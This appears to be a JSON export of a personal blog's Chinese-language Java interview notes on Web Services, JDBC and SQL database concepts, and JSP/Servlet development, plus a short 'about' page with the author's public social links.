Service均采用了HTTP做传输协议，因为HTTP协议能穿越防火墙，Java的远程方法调用（RMI）等是重量级协议，通常不能穿越防火墙），因此可以将REST视为基于HTTP协议的软件架构。REST中最重要的两个概念是资源定位和资源操作，而HTTP协议恰好完整的提供了这两个点。HTTP协议中的URI可以完成资源定位，而GET、POST、OPTION、DELETE方法可以完成资源操作。因此REST完全依赖HTTP协议就可以完成Web Service，而不像SOAP协议那样只利用了HTTP的传输特性，定位和操作都是由SOAP协议自身完成的，也正是由于SOAP消息的存在使得基于SOAP的Web Service显得笨重而逐渐被淘汰。 请你谈谈对SOAP、WSDL、UDDI的了解。- SOAP：简单对象访问协议（Simple Object Access Protocol），是Web Service中交换数据的一种协议规范。- WSDL：Web服务描述语言（Web Service Description Language），它描述了Web服务的公共接口。这是一个基于XML的关于如何与Web服务通讯和使用的服务描述；也就是描述与目录中列出的Web服务进行交互时需要绑定的协议和信息格式。通常采用抽象语言描述该服务支持的操作和信息，使用的时候再将实际的网络协议和信息格式绑定给该服务。- UDDI：统一描述、发现和集成（Universal Description, Discovery and Integration），它是一个基于XML的跨平台的描述规范，可以使世界范围内的企业在互联网上发布自己所提供的服务。简单的说，UDDI是访问各种WSDL的一个门面（可以参考设计模式中的门面模式）。 WEB SERVICE名词解释，JSWDL开发包的介绍，JAXP、JAXM的解释。SOAP、UDDI,WSDL解释。Web ServiceWeb Service是基于网络的、分布式的模块化组件，它执行特定的任务，遵守具体的技术规范，这些规范使得WebService能与其他兼容的组件进行互操作。JAXP(Java API for XML Parsing) 定义了在Java中使用DOM, SAX, XSLT的通用的接口。这样在你的程序中你只要使用这些通用的接口，当你需要改变具体的实现时候也不需要修改代码。JAXM(Java API for XML Messaging) 是为SOAP通信提供访问方法和传输机制的API。WSDL是一种 XML 格式，用于将网络服务描述为一组端点，这些端点对包含面向文档信息或面向过程信息的消息进行操作。这种格式首先对操作和消息进行抽象描述，然后将其绑定到具体的网络协议和消息格式上以定义端点。相关的具体端点即组合成为抽象端点（服务）。SOAP即简单对象访问协议(Simple Object Access Protocol)，它是用于交换XML编码信息的轻量级协议。UDDI 的目的是为电子商务建立标准；UDDI是一套基于Web的、分布式的、为Web Service提供的、信息注册中心的实现标准规范，同时也包含一组使企业能将自身提供的Web Service注册，以使别的企业能够发现的访问协议的实现标准。soap是web service最关键的技术，是web service中数据和方法调传输的介质。WSDL（web service definition language）描述了web service的接口和功能。","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://kayleh.top/tags/Interview/"}]},{"title":"JDBC","slug":"JDBC","date":"2020-07-15T23:06:43.000Z","updated":"2021-04-11T17:11:28.208Z","comments":true,"path":"jdbc/","link":"","permalink":"https://kayleh.top/jdbc/","excerpt":"JDBC","text":"JDBC SQL现在有一个学生表，一个课程成绩表，请问，怎么找出学生课程的最高分数，谈一谈思路现在，有一个组合索引（A,B,C），可以有哪几种查询方式？1234567891011121314151617181920212223242526272829303132333435363738优: select * from test where a=10 and b&gt;50差: select * from test where b = 50优: select * from test order by a差: select * from test order by b差: select * from test order by c优: select * from test where a=10 order by a优: select * from test where a=10 order by b差: select * from test where a=10 order by c优: select * from test where a&gt;10 order by a差: select * from test where a&gt;10 order by b差: select * from test where a&gt;10 order by c优: select * from test where a=10 and b=10 order by a优: select * from test where a=10 and b=10 order by b优: select * from test where a=10 and b=10 order by c优: select * from test where a=10 and b=10 order by a优: select * from test where a=10 and b&gt;10 order by b差: select * from test where a=10 and b&gt;10 order by c 写SQL：找出每个城市的最新一条记录。 id 城市 人口 信息 创建时间1 北京 100 info1 时间戳2 北京 100 info2 时间戳3 上海 100 info3 时间戳4 上海 100 info4 时间戳 请你讲解一下数据连接池的工作机制?J2EE 服务器启动时会建立一定数量的池连接，并一直维持不少于此数目的池连接。客户端程序需要连接时，池驱动程序会返回一个未使用的池连接并将其表记为忙。如果当前没有空闲连接，池驱动程序就新建一定数量的连接，新建连接的数量由配置参数决定。当使用的池连接调用完成后，池驱动程序将此连接表记为空闲，其他调用就可以使用这个连接。 了解继承映射吗，请简单讲讲你的理解。① 每个继承结构一张表（table per class hierarchy），不管多少个子类都用一张表。② 每个子类一张表（table per subclass），公共信息放一张表，特有信息放单独的表。③ 每个具体类一张表（table per concrete class），有多少个子类就有多少张表。第一种方式属于单表策略，其优点在于查询子类对象的时候无需表连接，查询速度快，适合多态查询；缺点是可能导致表很大。后两种方式属于多表策略，其优点在于数据存储紧凑，其缺点是需要进行连接查询，不适合多态查询。 请介绍一些你了解的数据库优化方法（1）选取最适用的字段属性 MySQL可以很好的支持大数据量的存取，但是一般说来，数据库中的表越小，在它上面执行的查询也就会越快。因此，在创建表的时候，为了获得更好的性能，我们可以将表中字段的宽度设得尽可能小。 例如，在定义邮政编码这个字段时，如果将其设置为CHAR(255),显然给数据库增加了不必要的空间，甚至使用VARCHAR这种类型也是多余的，因为CHAR(6)就可以很好的完成任务了。同样的，如果可以的话，我们应该使用MEDIUMINT而不是BIGIN来定义整型字段。 另外一个提高效率的方法是在可能的情况下，应该尽量把字段设置为NOTNULL，这样在将来执行查询的时候，数据库不用去比较NULL值。对于某些文本字段，例如“省份”或者“性别”，我们可以将它们定义为ENUM类型。因为在MySQL中，ENUM类型被当作数值型数据来处理，而数值型数据被处理起来的速度要比文本类型快得多。这样，我们又可以提高数据库的性能。 （2）使用连接（JOIN）来代替子查询(Sub-Queries) MySQL从4.1开始支持SQL的子查询。这个技术可以使用SELECT语句来创建一个单列的查询结果，然后把这个结果作为过滤条件用在另一个查询中。例如，我们要将客户基本信息表中没有任何订单的客户删除掉，就可以利用子查询先从销售信息表中将所有发出订单的客户ID取出来，然后将结果传递给主查询 （3）使用联合(UNION)来代替手动创建的临时表 MySQL从4.0的版本开始支持union查询，它可以把需要使用临时表的两条或更多的select查询合并的一个查询中。在客户端的查询会话结束的时候，临时表会被自动删除，从而保证数据库整齐、高效。使用union来创建查询的时候，我们只需要用UNION作为关键字把多个select语句连接起来就可以了，要注意的是所有select语句中的字段数目要想同。下面的例子就演示了一个使用UNION的查询。 （4）事务 尽管我们可以使用子查询（Sub-Queries）、连接（JOIN）和联合（UNION）来创建各种各样的查询，但不是所有的数据库操作都可以只用一条或少数几条SQL语句就可以完成的。更多的时候是需要用到一系列的语句来完成某种工作。但是在这种情况下，当这个语句块中的某一条语句运行出错的时候，整个语句块的操作就会变得不确定起来。设想一下，要把某个数据同时插入两个相关联的表中，可能会出现这样的情况：第一个表中成功更新后，数据库突然出现意外状况，造成第二个表中的操作没有完成，这样，就会造成数据的不完整，甚至会破坏数据库中的数据。要避免这种情况，就应该使用事务，它的作用是：要么语句块中每条语句都操作成功，要么都失败。换句话说，就是可以保持数据库中数据的一致性和完整性。事物以BEGIN关键字开始，COMMIT关键字结束。在这之间的一条SQL操作失败，那么，ROLLBACK命令就可以把数据库恢复到BEGIN开始之前的状态。 说明一下 left join 和 right join 的区别？left join(左联接) 返回包括左表中的所有记录和右表中联结字段相等的记录right join(右联接) 返回包括右表中的所有记录和左表中联结字段相等的记录 比如： 表A记录如下：aID aNum1 a200501112 a200501123 a200501134 a200501145 a20050115 表B记录如下:bID bName1 20060324012 20060324023 20060324034 20060324048 2006032408 left join是以A表的记录为基础的,A可以看成左表,B可以看成右表,left join是以左表为准的.换句话说,左表(A)的记录将会全部表示出来,而右表(B)只会显示符合搜索条件的记录(例子中为: A.aID = B.bID).B表记录不足的地方均为NULL. 介绍一下 mysql的主从复制？MySQL主从复制是其最重要的功能之一。主从复制是指一台服务器充当主数据库服务器，另一台或多台服务器充当从数据库服务器，主服务器中的数据自动复制到从服务器之中。对于多级复制，数据库服务器即可充当主机，也可充当从机。MySQL主从复制的基础是主服务器对数据库修改记录二进制日志，从服务器通过主服务器的二进制日志自动执行更新。 MySQL主从复制的两种情况：同步复制和异步复制，实际复制架构中大部分为异步复制。 复制的基本过程如下： Slave上面的IO进程连接上Master，并请求从指定日志文件的指定位置（或者从最开始的日志）之后的日志内容。 Master接收到来自Slave的IO进程的请求后，负责复制的IO进程会根据请求信息读取日志指定位置之后的日志信息，返回给Slave的IO进程。返回信息中除了日志所包含的信息之外，还包括本次返回的信息已经到Master端的bin-log文件的名称以及bin-log的位置。 Slave的IO进程接收到信息后，将接收到的日志内容依次添加到Slave端的relay-log文件的最末端，并将读取到的Master端的 bin-log的文件名和位置记录到master-info文件中，以便在下一次读取的时候能够清楚的告诉Master“我需要从某个bin-log的哪个位置开始往后的日志内容，请发给我”。 Slave的Sql进程检测到relay-log中新增加了内容后，会马上解析relay-log的内容成为在Master端真实执行时候的那些可执行的内容，并在自身执行。 数据库ACID的特性。原子性是指事务是一个不可分割的工作单位，事务中的操作要么都发生，要么都不发生。 一致性指事务前后数据的完整性必须保持一致。 隔离性指多个用户并发访问数据库时，一个用户的事务不能被其他用户的事务所干扰，多个并发事务之间数据要相互隔离。 持久性是指一个事务一旦提交，它对数据库中数据的改变就是永久性的，即便数据库发生故障也不应该对其有任何影响。 请你介绍一下，数据库的三个范式？第一范式（1NF）强调的是列的原子性，即列不能够再分成其他几列。第二范式（2NF）首先是 1NF，另外包含两部分内容，一是表必须有一个主键；二是没有包含在主键中的列必须完全依赖于主键，而不能只依赖于主键的一部分。在1NF基础上，任何非主属性不依赖于其它非主属性[在2NF基础上消除传递依赖]。第三范式（3NF）第三范式（3NF）是第二范式（2NF）的一个子集，即满足第三范式（3NF）必须满足第二范式（2NF）。首先是 2NF，另外非主键列必须直接依赖于主键，不能存在传递依赖。即不能存在：非主键列 A 依赖于非主键列 B，非主键列 B 依赖于主键的情况。 请你介绍一下，数据库乐观锁和悲观锁悲观锁 悲观锁（Pessimistic Lock），顾名思义，就是很悲观，每次去拿数据的时候都认为别人会修改，所以每次在拿数据的时候都会上锁，这样别人想拿这个数据就会block直到它拿到锁。悲观锁：假定会发生并发冲突，屏蔽一切可能违反数据完整性的操作。 Java synchronized 就属于悲观锁的一种实现，每次线程要修改数据时都先获得锁，保证同一时刻只有一个线程能操作数据，其他线程则会被block。 乐观锁 乐观锁（Optimistic Lock），顾名思义，就是很乐观，每次去拿数据的时候都认为别人不会修改，所以不会上锁，但是在提交更新的时候会判断一下在此期间别人有没有去更新这个数据。乐观锁适用于读多写少的应用场景，这样可以提高吞吐量。 乐观锁：假设不会发生并发冲突，只在提交操作时检查是否违反数据完整性。 乐观锁一般来说有以下2种方式： 使用数据版本（Version）记录机制实现，这是乐观锁最常用的一种实现方式。何谓数据版本？即为数据增加一个版本标识，一般是通过为数据库表增加一个数字类型的 “version” 字段来实现。当读取数据时，将version字段的值一同读出，数据每更新一次，对此version值加一。当我们提交更新的时候，判断数据库表对应记录的当前版本信息与第一次取出来的version值进行比对，如果数据库表当前版本号与第一次取出来的version值相等，则予以更新，否则认为是过期数据。 使用时间戳（timestamp）。乐观锁定的第二种实现方式和第一种差不多，同样是在需要乐观锁控制的table中增加一个字段，名称无所谓，字段类型使用时间戳（timestamp）, 和上面的version类似，也是在更新提交的时候检查当前数据库中数据的时间戳和自己更新前取到的时间戳进行对比，如果一致则OK，否则就是版本冲突。 介绍一下数据库的隔离级别 隔离级别 脏读（Dirty Read） 不可重复读（NonRepeatable Read） 幻读（Phantom Read） 未提交读（Read uncommitted） 可能 可能 可能 已提交读（Read committed） 不可能 可能 可能 可重复读（Repeatable read） 不可能 不可能 可能 可串行化（Serializable ） 不可能 不可能 不可能 未提交读(Read Uncommitted)：允许脏读，也就是可能读取到其他会话中未提交事务修改的数据。 提交读(Read Committed)：只能读取到已经提交的数据。Oracle等多数数据库默认都是该级别 (不重复读)。 可重复读(Repeated Read)：可重复读。在同一个事务内的查询都是事务开始时刻一致的，InnoDB默认级别。在SQL标准中，该隔离级别消除了不可重复读，但是还存在幻象读。 串行读(Serializable)：完全串行化的读，每次读都需要获得表级共享锁，读写相互都会阻塞。 说明一下，数据库索引底层是怎样实现的，哪些情况下索引会失效B+树实现的。 没有遵循最左匹配原则。 一些关键字会导致索引失效，例如 or， ！= ， not in，is null ,is not unll like查询是以%开头 隐式转换会导致索引失效。 对索引应用内部函数，索引字段进行了运算。 mysql数据库的两种引擎 区别InnoDB是聚集索引，支持事务，支持行级锁；MyISAM是非聚集索引，不支持事务，只支持表级锁。 请介绍一下，数据库索引，以及，什么时候用Innodb什么时候用MyISAM。索引是对数据库表中一列或多列的值进行排序的一种结构，使用索引可快速访问数据库表中的特定信息。如果想按特定职员的姓来查找他或她，则与在表中搜索所有的行相比，索引有助于更快地获取信息。索引的一个主要目的就是加快检索表中数据的方法，亦即能协助信息搜索者尽快的找到符合限制条件的记录ID的辅助数据结构。InnoDB主要面向在线事务处理（OLTP）的应用。MyISAM主要面向一些OLAP的应用。 数据库水平切分与垂直切分垂直拆分就是要把表按模块划分到不同数据库表中（当然原则还是不破坏第三范式），这种拆分在大型网站的演变过程中是很常见的。当一个网站还在很小的时候，只有小量的人来开发和维护，各模块和表都在一起，当网站不断丰富和壮大的时候，也会变成多个子系统来支撑，这时就有按模块和功能把表划分出来的需求。其实，相对于垂直切分更进一步的是服务化改造，说得简单就是要把原来强耦合的系统拆分成多个弱耦合的服务，通过服务间的调用来满足业务需求看，因此表拆出来后要通过服务的形式暴露出去，而不是直接调用不同模块的表，淘宝在架构不断演变过程，最重要的一环就是服务化改造，把用户、交易、店铺、宝贝这些核心的概念抽取成独立的服务，也非常有利于进行局部的优化和治理，保障核心模块的稳定性。 垂直拆分：单表大数据量依然存在性能瓶颈 水平拆分，上面谈到垂直切分只是把表按模块划分到不同数据库，但没有解决单表大数据量的问题，而水平切分就是要把一个表按照某种规则把数据划分到不同表或数据库里。例如像计费系统，通过按时间来划分表就比较合适，因为系统都是处理某一时间段的数据。而像SaaS应用，通过按用户维度来划分数据比较合适，因为用户与用户之间的隔离的，一般不存在处理多个用户数据的情况，简单的按user_id范围来水平切分。 通俗理解：水平拆分行，行数据拆分到不同表中， 垂直拆分列，表数据拆分到不同表中。 JDBC中如何进行事务处理？Connection提供了事务处理的方法，通过调用setAutoCommit(false)可以设置手动提交事务；当事务完成后用commit()显式提交事务；如果在事务处理过程中发生异常则通过rollback()进行事务回滚。除此之外，从JDBC 3.0中还引入了Savepoint（保存点）的概念，允许通过代码设置保存点并让事务回滚到指定的保存点。 什么是数据库中事务的ACID？- 原子性(Atomic)：事务中各项操作，要么全做要么全不做，任何一项操作的失败都会导致整个事务的失败； - 一致性(Consistent)：事务结束后系统状态是一致的；- 隔离性(Isolated)：并发执行的事务彼此无法看到对方的中间状态；- 持久性(Durable)：事务完成后所做的改动都会被持久化，即使发生灾难性的失败。通过日志和同步备份可以在故障发生后重建数据。 关于事务，在面试中被问到的概率是很高的，可以问的问题也是很多的。首先需要知道的是，只有存在并发数据访问时才需要事务。当多个事务访问同一数据时，可能会存在5类问题，包括3类数据读取问题（脏读、不可重复读和幻读）和2类数据更新问题（第1类丢失更新和第2类丢失更新）。 使用JDBC操作数据库时，经常遇到性能问题，请你说明一下如何提升读取数据的性能，以及更新数据的性能？要提升读取数据的性能，可以指定通过结果集（ResultSet）对象的setFetchSize()方法指定每次抓取的记录数（典型的空间换时间策略）；要提升更新数据的性能可以使用PreparedStatement语句构建批处理，将若干SQL语句置于一个批处理中执行。 请你讲讲 Statement 和 PreparedStatement 的区别？哪个性能更好？与Statement相比，①PreparedStatement接口代表预编译的语句，它主要的优势在于可以减少SQL的编译错误并增加SQL的安全性（减少SQL注射攻击的可能性）；②PreparedStatement中的SQL语句是可以带参数的，避免了用字符串连接拼接SQL语句的麻烦和不安全；③当批量处理SQL或频繁执行相同的查询时，PreparedStatement有明显的性能上的优势，由于数据库可以将编译优化后的SQL语句缓存起来，下次执行相同结构的语句时就会很快（不用再次编译和生成执行计划）。 为了提供对存储过程的调用，JDBC API中还提供了CallableStatement接口。存储过程（Stored Procedure）是数据库中一组为了完成特定功能的SQL语句的集合，经编译后存储在数据库中，用户通过指定存储过程的名字并给出参数（如果该存储过程带有参数）来执行它。虽然调用存储过程会在网络开销、安全性、性能上获得很多好处，但是存在如果底层数据库发生迁移时就会有很多麻烦，因为每种数据库的存储过程在书写上存在不少的差别。 请你解释一下Jdo以及它的作用JDO 是Java对象持久化的新的规范，为java data object的简称,也是一个用于存取某种数据仓库中的对象的标准化API。JDO提供了透明的对象存储，因此对开发人员来说，存储数据对象完全不需要额外的代码（如JDBC API的使用）。这些繁琐的例行工作已经转移到JDO产品提供商身上，使开发人员解脱出来，从而集中时间和精力在业务逻辑上。另外，JDO很灵活，因为它可以在任何数据底层上运行。JDBC只是面向关系数据库（RDBMS）JDO更通用，提供到任何数据底层的存储功能，比如关系数据库、文件、XML以及对象数据库（ODBMS）等等，使得应用可移植性更强。 谈谈JDBC的反射，以及它的作用？通过反射com.mysql.jdbc.Driver类，实例化该类的时候会执行该类内部的静态代码块，该代码块会在Java实现的DriverManager类中注册自己,DriverManager管理所有已经注册的驱动类，当调用DriverManager.geConnection方法时会遍历这些驱动类，并尝试去连接数据库，只要有一个能连接成功，就返回Connection对象，否则则报异常。","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://kayleh.top/tags/Interview/"}]},{"title":"contract","slug":"contract","date":"2020-07-15T05:57:44.000Z","updated":"2021-04-11T17:11:28.485Z","comments":true,"path":"contract/","link":"","permalink":"https://kayleh.top/contract/","excerpt":"","text":"1234567891011121314 ,-. ,--, ,---, ,--&#x2F; &#x2F;| ,--.&#39;| ,--.&#39; |,--. :&#x2F; | | | : | | :: : &#39; &#x2F; : : &#39; : : :| &#39; &#x2F; ,--.--. .--, | &#39; | ,---. : | |,--.&#39; | : &#x2F; \\ &#x2F;_ .&#x2F;| &#39; | | &#x2F; \\ | : &#39; || | \\ .--. .-. | , &#39; , &#39; : | | : &#x2F; &#x2F; | | | &#x2F;&#39; :&#39; : |. \\ \\__\\&#x2F;: . . &#x2F;___&#x2F; \\: | &#39; : |__ . &#39; &#x2F; | &#39; : | | || | &#39; \\ \\ ,&quot; .--.; | . \\ &#39; | | | &#39;.&#39;| &#39; ; &#x2F;| | | &#39; | :&#39; : |--&#39; &#x2F; &#x2F; ,. | \\ ; : ; : ; &#39; | &#x2F; | | : :_:,&#39;; |,&#39; ; : .&#39; \\ \\ \\ ; | , &#x2F; | : | | | ,&#39;&#39;--&#39; | , .-.&#x2F; : \\ \\ ---&#96;-&#39; \\ \\ &#x2F; &#96;--&#39;&#39; &#96;--&#96;---&#39; \\ &#39; ; &#96;----&#39; &#96;--&#96; 我是一名保安，安全与我无关 保安？保护不了任何人 Github: https://github.com/Kayleh Google: mailto:kaylehisdied@gmail.com Facebook: https://www.facebook.com/kayleh.yao.7 Twitter: https://twitter.com/y40jinqing Weibo: https://weibo.com/5737136689/profile?rightmod=1&amp;wvr=6&amp;mod=personinfo Zhihu: https://www.zhihu.com/people/ni-hui-gan-xie-wo-de Linkedin: https://www.linkedin.com/in/jinqing-yao-97a750186/","categories":[],"tags":[{"name":"about","slug":"about","permalink":"https://kayleh.top/tags/about/"}]},{"title":"J2EE","slug":"J2EE","date":"2020-07-13T21:44:34.000Z","updated":"2021-04-11T17:11:28.197Z","comments":true,"path":"j2ee/","link":"","permalink":"https://kayleh.top/j2ee/","excerpt":"Java Web","text":"Java Web JAVA应用服务器都有那些？BEA WebLogic Server， IBM WebSphere Application Server， Oracle9i Application Server jBoss， Tomcat 在什么情况下回使用assert？assertion (断言)在软件开发中是一种常用的调试方式，很多开发语言中都支持这种机制。在实现中，assertion就是在程序中的一条语句，它对一个 boolean表达式进行检查，一个正确程序必须保证这个boolean表达式的值为true；如果该值为false，说明程序已经处于不正确的状态下，系统将给出警告或退出。一般来说，assertion用于保证程序最基本、关键的正确性。assertion检查通常在开发和测试时开启。为了提高性能，在软件发布后，assertion检查通常是关闭的。 1分钟之内只能处理1000个请求，你怎么实现，手撕代码? 限流的几种方法：计数器，滑动窗口、漏桶法、令牌桶 如何在链接里不输入项目名称的情况下启动项目？ 可在taomcat配置虚拟目录。 说明一下JSP中的静态包含和动态包含的有哪些区别？静态包含是通过JSP的include指令包含页面，动态包含是通过JSP标准动作包含页面。静态包含是编译时包含，如果包含的页面不存在则会产生编译错误，而且两个页面的”contentType”属性应保持一致，因为两个页面会合二为一，只产生一个class文件，因此被包含页面发生的变动再包含它的页面更新前不会得到更新。动态包含是运行时包含，可以向被包含的页面传递参数，包含页面和被包含页面是独立的，会编译出两个class文件，如果被包含的页面不存在，不会产生编译错误，也不影响页面其他部分的执行。 例如： &lt;%— 静态包含 —%&gt;&lt;%@ include file=”…” %&gt; &lt;%— 动态包含 —%&gt; &lt;&lt;/jsp:include&gt;&gt; 请说一下表达式语言（EL）的隐式对象以及该对象的作用EL的隐式对象包括：pageContext、initParam（访问上下文参数）、param（访问请求参数）、paramValues、header（访问请求头）、headerValues、cookie（访问cookie）、applicationScope（访问application作用域）、sessionScope（访问session作用域）、requestScope（访问request作用域）、pageScope（访问page作用域）。 谈一谈JSP有哪些内置对象？以及这些对象的作用分别是什么？JSP有9个内置对象：- request：封装客户端的请求，其中包含来自GET或POST请求的参数；- response：封装服务器对客户端的响应；- pageContext：通过该对象可以获取其他对象；- session：封装用户会话的对象；- application：封装服务器运行环境的对象；- out：输出服务器响应的输出流对象；- config：Web应用的配置对象；- page：JSP页面本身（相当于Java程序中的this）；- exception：封装页面抛出异常的对象。 如果用Servlet来生成网页中的动态内容无疑是非常繁琐的工作，另一方面，所有的文本和HTML标签都是硬编码，即使做出微小的修改，都需要进行重新编译。JSP解决了Servlet的这些问题，它是Servlet很好的补充，可以专门用作为用户呈现视图（View），而Servlet作为控制器（Controller）专门负责处理用户请求并转发或重定向到某个页面。基于Java的Web开发很多都同时使用了Servlet和JSP。JSP页面其实是一个Servlet，能够运行Servlet的服务器（Servlet容器）通常也是JSP容器，可以提供JSP页面的运行环境，Tomcat就是一个Servlet/JSP容器。第一次请求一个JSP页面时，Servlet/JSP容器首先将JSP页面转换成一个JSP页面的实现类，这是一个实现了JspPage接口或其子接口HttpJspPage的Java类。JspPage接口是Servlet的子接口，因此每个JSP页面都是一个Servlet。转换成功后，容器会编译Servlet类，之后容器加载和实例化Java字节码，并执行它通常对Servlet所做的生命周期操作。对同一个JSP页面的后续请求，容器会查看这个JSP页面是否被修改过，如果修改过就会重新转换并重新编译并执行。如果没有则执行内存中已经存在的Servlet实例。 说说weblogic中一个Domain的缺省目录结构?比如要将一个简单的helloWorld.jsp放入何目录下,然后在浏览器上就可打入主机？端口号//helloword.jsp就可以看到运行结果了? 又比如这其中用到了一个自己写的javaBean该如何办?Domain 目录服务器目录applications，将应用目录放在此目录下将可以作为应用访问，如果是Web应用，应用目录需要满足Web应用目录要求，jsp文件可以直接放在应用目录中，Javabean需要放在应用目录的WEB-INF目录的classes目录中，设置服务器的缺省应用将可以实现在浏览器上无需输入应用名。 请说明一下jsp有哪些动作? 这些动作的作用又分别是什么?JSP 共有以下6种基本动作 jsp:include：在页面被请求的时候引入一个文件。 jsp:useBean：寻找或者实例化一个JavaBean。jsp:setProperty：设置JavaBean的属性。 jsp:getProperty：输出某个JavaBean的属性。 jsp:forward：把请求转到一个新的页面。 jsp:plugin：根据浏览器类型为Java插件生成OBJECT或EMBED标记。 详细说明一下Request对象的主要方法是什么？ setAttribute(String name,Object)：设置名字为name的request的参数值getAttribute(String name)：返回由name指定的属性值getAttributeNames()：返回request对象所有属性的名字集合，结果是一个枚举的实例getCookies()：返回客户端的所有Cookie对象，结果是一个Cookie数组getCharacterEncoding()：返回请求中的字符编码方式getContentLength()：返回请求的Body的长度getHeader(String name)：获得HTTP协议定义的文件头信息getHeaders(String name)：返回指定名字的request Header的所有值，结果是一个枚举的实例getHeaderNames()：返回所以request Header的名字，结果是一个枚举的实例getInputStream()：返回请求的输入流，用于获得请求中的数据getMethod()：获得客户端向服务器端传送数据的方法getParameter(String name)：获得客户端传送给服务器端的有name指定的参数值getParameterNames()：获得客户端传送给服务器端的所有参数的名字，结果是一个枚举的实例getParameterValues(String name)：获得有name指定的参数的所有值getProtocol()：获取客户端向服务器端传送数据所依据的协议名称getQueryString()：获得查询字符串getRequestURI()：获取发出请求字符串的客户端地址getRemoteAddr()：获取客户端的IP地址getRemoteHost()：获取客户端的名字getSession([Boolean create])：返回和请求相关SessiongetServerName()：获取服务器的名字getServletPath()：获取客户端所请求的脚本文件的路径getServerPort()：获取服务器的端口号removeAttribute(String name)：删除请求中的一个属性 请简要说明一下四种会话跟踪技术分别是什么？会话作用域ServletsJSP 页面描述page否是代表与一个页面相关的对象和属性。一个页面由一个编译好的 Java servlet 类（可以带有任何的 include 指令，但是没有 include 动作）表示。这既包括 servlet 又包括被编译成 servlet 的 JSP 页面request是是代表与 Web 客户机发出的一个请求相关的对象和属性。一个请求可能跨越多个页面，涉及多个 Web 组件（由于forward 指令和 include 动作的关系）session是是代表与用于某个 Web 客户机的一个用户体验相关的对象和属性。一个 Web 会话可以也经常会跨越多个客户机请求application是是代表与整个 Web 应用程序相关的对象和属性。这实质上是跨越整个 Web 应用程序，包括多个页面、请求和会话的一个全局作用域。 请简要说明一下JSP和Servlet有哪些相同点和不同点？另外他们之间的联系又是什么呢？JSP 是Servlet技术的扩展，本质上是Servlet的简易方式，更强调应用的外表表达。JSP编译后是”类servlet”。Servlet和JSP最主要的不同点在于，Servlet的应用逻辑是在Java文件中，并且完全从表示层中的HTML里分离开来。而JSP的情况是Java和HTML可以组合成一个扩展名为.jsp的文件。JSP侧重于视图，Servlet主要用于控制逻辑 请说明一下JSP的内置对象以及该对象的使用方法。 request表示HttpServletRequest对象。它包含了有关浏览器请求的信息，并且提供了几个用于获取cookie, header, 和session数据的有用的方法。response表示HttpServletResponse对象，并提供了几个用于设置送回浏览器的响应的方法（如cookies,头信息等）out对象是javax.jsp.JspWriter的一个实例，并提供了几个方法使你能用于向浏览器回送输出结果。pageContext表示一个javax.servlet.jsp.PageContext对象。它是用于方便存取各种范围的名字空间、servlet相关的对象的API，并且包装了通用的servlet相关功能的方法。session表示一个请求的javax.servlet.http.HttpSession对象。Session可以存贮用户的状态信息applicaton 表示一个javax.servle.ServletContext对象。这有助于查找有关servlet引擎和servlet环境的信息config表示一个javax.servlet.ServletConfig对象。该对象用于存取servlet实例的初始化参数。page表示从该页面产生的一个servlet实例 请说明一下web.xml文件中可以配置哪些内容？ web.xml用于配置Web应用的相关信息，如：监听器（listener）、过滤器（filter）、 Servlet、相关参数、会话超时时间、安全验证方式、错误页面等，下面是一些开发中常见的配置： ①配置Spring上下文加载监听器加载Spring配置文件并创建IoC容器： contextConfigLocation&lt;/param-name&gt; classpath:applicationContext.xml&lt;/param-value&gt;&lt;/context-param&gt; org.springframework.web.context.ContextLoaderListener ②配置Spring的OpenSessionInView过滤器来解决延迟加载和Hibernate会话关闭的矛盾： openSessionInView org.springframework.orm.hibernate3.support.OpenSessionInViewFilter openSessionInView&lt;/filter-name&gt; /*&lt;/url-pattern&gt;&lt;/filter-mapping&gt; ③配置会话超时时间为10分钟： 10&lt;/session-timeout&gt;&lt;/session-config&gt; ④配置404和Exception的错误页面： 404&lt;/error-code&gt; /error.jsp&lt;/error-page&gt; java.lang.Exception&lt;/exception-type&gt; /error.jsp&lt;/error-page&gt;⑤配置安全认证方式： ProtectedArea&lt;/web-resource-name&gt; /admin/*&lt;/url-pattern&gt; GET&lt;/http-method&gt; POST&lt;/http-method&gt;&lt;/web-resource-collection&gt; admin&lt;/role-name&gt;&lt;/auth-constraint&gt;&lt;/security-constraint&gt; BASIC&lt;/auth-method&gt;&lt;/login-config&gt; admin&lt;/role-name&gt;&lt;/security-role&gt; 谈谈你对Javaweb开发中的监听器的理解？Java Web开发中的监听器（listener）就是application、session、request三个对象创建、销毁或者往其中添加修改删除属性时自动执行代码的功能组件，如下所示：①ServletContextListener：对Servlet上下文的创建和销毁进行监听。②ServletContextAttributeListener：监听Servlet上下文属性的添加、删除和替换。③HttpSessionListener：对Session的创建和销毁进行监听。 session的销毁有两种情况：1). session超时（可以在web.xml中通过/标签配置超时时间）；2). 通过调用session对象的invalidate()方法使session失效。④HttpSessionAttributeListener：对Session对象中属性的添加、删除和替换进行监听。⑤ServletRequestListener：对请求对象的初始化和销毁进行监听。⑥ServletRequestAttributeListener：对请求对象属性的添加、删除和替换进行监听。 请问过滤器有哪些作用？以及过滤器的用法又是什么呢?Java Web开发中的过滤器（filter）是从Servlet 2.3规范开始增加的功能，并在Servlet 2.4规范中得到增强。对Web应用来说，过滤器是一个驻留在服务器端的Web组件，它可以截取客户端和服务器之间的请求与响应信息，并对这些信息进行过滤。当Web容器接受到一个对资源的请求时，它将判断是否有过滤器与这个资源相关联。如果有，那么容器将把请求交给过滤器进行处理。在过滤器中，你可以改变请求的内容，或者重新设置请求的报头信息，然后再将请求发送给目标资源。当目标资源对请求作出响应时候，容器同样会将响应先转发给过滤器，在过滤器中你可以对响应的内容进行转换，然后再将响应发送到客户端。 常见的过滤器用途主要包括：对用户请求进行统一认证、对用户的访问请求进行记录和审核、对用户发送的数据进行过滤或替换、转换图象格式、对响应内容进行压缩以减少传输量、对请求或响应进行加解密处理、触发资源访问事件、对XML的输出应用XSLT等。和过滤器相关的接口主要有：Filter、FilterConfig和FilterChain。 请问使用Servlet如何获取用户配置的初始化参数以及服务器上下文参数？ 可以通过重写Servlet接口的init(ServletConfig)方法并通过ServletConfig对象的getInitParameter()方法来获取Servlet的初始化参数。可以通过ServletConfig对象的getServletContext()方法获取ServletContext对象，并通过该对象的getInitParameter()方法来获取服务器上下文参数。当然，ServletContext对象也在处理用户请求的方法（如doGet()方法）中通过请求对象的getServletContext()方法来获得。 